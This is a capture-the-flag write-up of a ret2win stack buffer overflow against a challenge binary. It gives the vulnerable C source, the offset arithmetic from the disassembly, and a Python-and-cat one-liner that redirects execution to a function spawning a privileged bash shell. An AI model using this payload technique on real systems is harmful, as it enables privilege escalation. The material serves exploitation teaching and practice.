## 1. Binary Specifications & Environmental Audit
Initial reconnaissance of the target challenge binary was conducted using standard Linux CLI utilities to map out the execution context and active kernel-space defenses.

### Mitigation Check (Checksec / Objdump):
* **Architecture:** ELF 64-bit LSB executable (AMD x86-64). Parameter passing adheres to the modern register-driven calling convention (RDI, RSI, RDX, etc.).
* **Stack Canary:** `No canary found`. The application lacks stack cookies, permitting unhindered manipulation of the function's return state (`RIP`) via localized stack corruption.
* **NX (No-Execute):** `NX enabled`. The stack segment is non-executable, neutralizing traditional shellcode injection attempts.
* **PIE (Position Independent Executable):** `No PIE`. The binary's code section maps to static, immutable virtual memory addresses.
* **ASLR (Address Space Layout Randomization):** `ON`. While global system memory layout randomness is active, the lack of PIE maintains consistent absolute mapping coordinates within the binary text segment.

---

## 2. Static Analysis & Source Code Review
The software's logic was evaluated via its provided C source code. The binary instantiates a static storage structure within its `main` function stack frame:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void callMeMaybe(){
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}

int main(int argc, char **argv){
    char buffer[256];
    int len, i;
    scanf("%s", buffer);
    len = strlen(buffer);
    printf("Hello %s\n", buffer);
    return 0;
}
```

### Vulnerability Identification:
The critical flaw resides within the user input ingestion layer. The program utilizes the unbounded `scanf` routine with a raw `%s` string specifier to populate the local `buffer` array:

```c
scanf("%s", buffer);
```

Because `%s` enforces no spatial boundaries or length restrictions during data extraction from the standard input stream (`stdin`), an operator can supply an arbitrarily large data payload. This programmatic design oversight induces a standard **Stack-based Buffer Overflow**, allowing data to spill past the 256-byte constraint boundary of `buffer` and cleanly overwrite the saved frame pointer (`RBP`) and instruction pointer (`RIP`).

### Target Optimization Window:
While the function `callMeMaybe()` is unreferenced in the legitimate program execution path, its presence inside a non-PIE binary configuration provides a static exploitation destination. The `-p` flag passed within the nested `execve` invocation ensures that inherited `SUID` administrative permissions are preserved upon shell execution.

---

## 3. Disassembly & Memory Alignment Audit
To establish the exact distance between the entry boundary of `buffer` and the saved instruction pointer, the static allocation behavior of the compiler was examined by disassembling the `main` routine inside GDB/GEF.

```assembly
0x000000000040062c <+4>:     sub    rsp,0x120
...
0x0000000000400640 <+24>:    lea    rax,[rbp-0x110]
0x0000000000400647 <+31>:    mov    rsi,rax
0x000000000040064a <+34>:    lea    rdi,[rip+0xd0]
0x0000000000400651 <+41>:    mov    eax,0x0
0x0000000000400656 <+46>:    call   0x4004f0 <__isoc99_scanf@plt>
```

### Offset Calculations:
* The instruction `sub rsp, 0x120` establishes a generalized global local stack frame tracking window of **288 bytes** (`0x120`).
* The source argument setup for `scanf` at instruction `<+24>` loads the exact start coordinate of the user-controlled storage array via `lea rax, [rbp-0x110]`.

Calculating the spatial delta between the true localized storage head and the saved base pointer (`RBP`) interface:

$$\text{Distance to RBP} = 0\text{x}110 \longrightarrow \text{272 bytes}$$

To completely bridge the gap and overwrite the adjacent execution tracking block (`RIP`) on an x86-64 architecture, the 8-byte width of the saved `RBP` frame state must also be accounted for:

$$\text{Total Padding Required} = 272 \text; \text{bytes (Buffer Space)} + 8 \text; \text{bytes (Saved RBP)} = 280 \text; \text{bytes}$$

### Target Address Resolution:
Inspecting the static text map reveals the precise absolute entry vector for the unreferenced target payload delivery routine:

```text
0x00000000004005e7  callMeMaybe
```

---

## 4. Exploitation Strategy & Payload Engineering

### Memory Alignment & Endianness:
Arbitrary stack saturation requires injecting a contiguous 280-byte block of junk characters, instantly followed by the 8-byte absolute address pointer pointing to `callMeMaybe`.

Due to the underlying Intel x86-64 Little-Endian data-ordering mechanics, the targeted memory value `0x00000000004005e7` must be formatted in a reversed byte sequence over an 8-byte field:

**Target QWORD :** `0x00000000004005e7` $\longrightarrow$ **Byte Stream Pattern :** `\xe7\x05\x40\x00\x00\x00\x00\x00`

### Exploit Orchestration:
The exploitation matrix utilizes an inline Python string generator to structure the data stream, combined with an active `cat` process inside a terminal subshell piping structure. This process keeps the standard input channel active after payload transit, maintaining an open connection to the spawned shell instance.

```bash
(python -c "print('A' * 280 + '\xe7\x05\x40\x00\x00\x00\x00\x00')"; cat) | ./ch35
```

Executing this workflow overrides the native function context teardown phase, forcing the process execution flow to jump to the `callMeMaybe` code segment during the `ret` cycle of the `main` block, resulting in stable shell acquisition under elevated SUID context permissions.

```text
Flag: REDACTED
```
